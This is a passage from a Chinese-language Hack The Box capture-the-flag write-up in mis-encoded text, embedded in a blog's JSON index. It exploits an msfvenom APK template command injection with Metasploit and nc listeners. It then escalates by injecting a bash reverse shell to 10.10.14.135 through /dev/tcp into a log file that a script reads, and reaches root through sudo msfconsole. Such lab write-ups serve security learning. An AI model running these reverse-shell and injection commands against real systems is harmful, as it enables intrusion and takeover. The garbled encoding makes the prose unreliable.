shellæ¼æ´ï¼Œä½†å¯¹æ¯”äº†ä¸‹ç‰ˆæœ¬ä¸é€‚ç”¨ï¼Œé‚£å°±åªèƒ½å…ˆè®¿é—®5000ç«¯å£çœ‹çœ‹å…·ä½“æƒ…å†µäº† è¿™æ˜¯ä¸€ä¸ªç»§æ‰¿äº†nmapã€msfvenomã€searchsploitå·¥å…·çš„ä¸€ä¸ªå°é»‘å®¢å·¥å…·ï¼Ÿé‚£å°±å…ˆå°è¯•ä¸€ä¸‹ä»–çš„å·¥å…·å§ã€‚ä½¿ç”¨nmapæ‰«æä¸€ä¸‹æœ¬åœ°ç«¯å£ æˆ‘ä»¬è·å¾—çš„ä¿¡æ¯æœ‰nmapç‰ˆæœ¬ä¸º7.80 å°è¯•æœç´¢æ¼æ´ é€šè¿‡googleå’Œexploit-dbå‡æœªå‘ç°å¯getshellçš„æ¼æ´ï¼Œæ”¾å¼ƒè¯¥æ€è·¯ æ¼æ´åˆ©ç”¨ æˆ‘ä»¬æŠŠç›®å…‰æ”¾åˆ°ç¬¬äºŒä¸ªå·¥å…·msfvenomä¸Š æœç´¢venomå‘ç°äº†ä¸€ä¸ªAPKæ¨¡æ¿å‘½ä»¤æ³¨å…¥æ¼æ´ å°†exploit-dbä¸Šçš„expç»™ä¸‹è½½ä¸‹æ¥å¹¶è¿›è¡Œä¿®æ”¹ ç„¶åæ‰§è¡Œè¯¥EXP è·å¾—äº†evil.apkæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°ç›‘å¬443ç«¯å£åå°†è¯¥æ–‡ä»¶ä¸Šä¼  èƒ½å¼¹å›æ¥ï¼Œä½†shellä¼¼ä¹æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨msfæ¥ç”Ÿæˆï¼Œå…å»éº»çƒ¦ é¦–å…ˆè¿è¡Œmsfç„¶å use exploit&#x2F;unix&#x2F;fileformat&#x2F;metasploit_msfvenom_apk_template_cmd_injectionæ¥è½½å…¥exp è®¾ç½®å¥½ipå’Œç«¯å£åè¾“å…¥exploitæ‰§è¡Œ è·å¾—è„šæœ¬&#x2F;root&#x2F;.msf4&#x2F;local&#x2F;msf.apk ç„¶åæœ¬åœ°ä½¿ç”¨ncç›‘å¬4444ç«¯å£ Nc â€“nvlp 4444 ä½¿ç”¨5000ç«¯å£ä¸Šçš„ç¬¬äºŒä¸ªè„šæœ¬è¿›è¡Œä¸Šä¼  æˆåŠŸåå¼¹å›ä¸€ä¸ªshellï¼Œæˆ‘ä»¬æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è·å¾—ä¸€ä¸ªç¨³å®šçš„shell SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null åœ¨æ ¹ç›®å½•ä¸‹æˆ‘ä»¬æˆåŠŸå–å¾—æ™®é€šç”¨æˆ·çš„flag æƒé™æå‡ è¿›å…¥homeç›®å½•ï¼Œå‘ç°é™¤äº†æˆ‘ä»¬ä½¿ç”¨çš„kidç”¨æˆ·ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªpwnç”¨æˆ· è¿›å…¥ç›®å½•å¹¶æŸ¥çœ‹æ–‡ä»¶ å‘ç°æœ‰ä¸€ä¸ªscanlosers.shè„šæœ¬ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è„šæœ¬å†…å®¹ è¯¥è„šæœ¬ä¼šä¸€ç›´æ‰«æ&#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackersçš„ç›®å½•æ–‡ä»¶çš„IPåœ°å€ è¯¥è„šæœ¬æœªå¯¹hackersæ–‡ä»¶ä¼ å…¥çš„å†…å®¹åšè¿‡æ»¤ï¼Œå¹¶ä¸”æˆ‘ä»¬ä½¿ç”¨çš„kidç”¨æˆ·ä¹Ÿæœ‰å¯¹è¯¥æ–‡ä»¶çš„ç¼–è¾‘æƒé™ï¼Œæˆ‘ä»¬ç›´æ¥å†™å…¥ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œæ¥è®©ä»–æŠŠpwnç”¨æˆ·çš„æƒé™åå¼¹ç»™æˆ‘ä»¬ æˆ‘ä»¬æœ¬åœ°ç›‘å¬ä¸€ä¸ªæ–°çš„ç«¯å£5555 Nc â€“nvlp 5555 å…ˆåˆ‡æ¢åˆ°logsç›®å½• Cd logs ç„¶åå†™å…¥æ¶æ„ä»£ç  echo â€œ ;&#x2F;bin&#x2F;bash -c â€˜bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.135&#x2F;5555 0&gt;&amp;1â€™ #â€ &gt;&gt; hackers ç›´æ¥ä½¿ç”¨echoè¾“å…¥ï¼Œæˆ–æ˜¯æ‰‹åŠ¨ç¼–è¾‘å‡å¯ï¼Œåªè¦èƒ½æŠŠå‘½ä»¤å†™å…¥è¿›å»å³å¯ å†™å…¥æˆåŠŸï¼Œå¹¶æˆåŠŸåå¼¹å›pwnç”¨æˆ·çš„shell ä½¿ç”¨sudo -læ£€æŸ¥ä¸€ä¸‹pwnç”¨æˆ·çš„æƒé™ å‘ç°pwnç”¨æˆ·æ‹¥æœ‰msfçš„æƒé™ï¼Œä¸”ä¸éœ€è¦rootå¯†ç ï¼Œç›´æ¥è¿›å…¥msfè°ƒç”¨rootæƒé™ sudo &#x2F;opt&#x2F;metasploit-framework-6.0.9&#x2F;msfconsole æˆåŠŸä½¿ç”¨rootæƒé™è¿›å…¥msfï¼Œæ­¤æ—¶å’±ä»¬å·²ç»æ‹¥æœ‰rootæƒé™ï¼Œç›´æ¥è¿›å…¥rootç›®å½•æ‹¿rootç”¨æˆ·çš„flagå³å¯ æˆåŠŸæ‹¿ä¸‹rootæƒé™çš„flag æ”¶å·¥ç¡è§‰","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]}],"categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"},{"name":"TryHackMe","slug":"TryHackMe","permalink":"http://www.lucifiel.com/tags/TryHackMe/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]}